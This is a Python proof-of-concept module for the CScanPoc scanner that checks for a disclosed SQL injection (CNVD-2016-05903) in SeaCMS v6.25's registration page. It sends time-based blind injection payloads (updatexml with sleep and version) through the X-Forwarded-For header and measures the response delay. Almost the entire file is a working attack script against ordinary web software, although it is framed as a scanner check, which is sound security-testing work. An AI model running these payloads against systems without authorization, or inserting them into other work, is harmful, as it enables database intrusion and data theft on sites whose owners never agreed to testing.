# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time


class Vuln(ABVuln):
    vuln_id = 'SEACMS_0005_L'  # 平台漏洞编号，留空
    name = '海洋CMS v6.25 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2016-04-11'  # 漏洞公布时间
    desc = '''
        SeaCMS是一套使用PHP编写的免费、开源的网站内容管理系统。该系统主要被设计用来管理视频点播资源。
        漏洞出现在注册那里reg.php
        ip无过滤被带入insert了。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2016-05903'  # 漏洞来源
    cnvd_id = 'CNVD-2016-05903'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'SEACMS(海洋CMS)'  # 漏洞应用名称
    product_version = '6.25'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '18c33342-2959-4f7c-a3f6-545f72ba8c5c'
    author = '47bwy'  # POC编写者
    create_date = '2018-07-20'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                },
                'cookies': {
                    'type': 'string',
                    'description': 'cookies',
                    'default': 'bid=111;uid=222',
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 首先登录用户。获取cookies
            s = requests.session()
            cookies = {}
            raw_cookies = self.get_option('cookies')
            for line in raw_cookies.split(';'):
                key, value = line.split('=', 1)  # 1代表只分一次，得到两个数据
                cookies[key] = value

            # 验证漏洞
            payload = '/upload/reg.php?action=reg'
            url = self.target + payload
            s.get(url, cookies=cookies)
            headers_sleep = {
                'X-Forwarded-For': "1.1.1.1' or updatexml(1,concat(0x7e,(sleep(5))),0) or '"
            }
            headers_normal = {
                'X-Forwarded-For': "1.1.1.1' or updatexml(1,concat(0x7e,(version())),0) or '"
            }
            data = "m_user=aaaaaa&m_pwd=123456&m_pwd2=123456&email=1111aaaaaas%40qq.coam"

            time_start = time.time()
            s.post(url, data=data, headers=headers_normal)
            time_end_normal = time.time()
            s.post(url, data=data, headers=headers_sleep)
            time_end_sleep = time.time()

            if (time_end_sleep-time_end_normal) - (time_end_normal-time_start) > 4:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
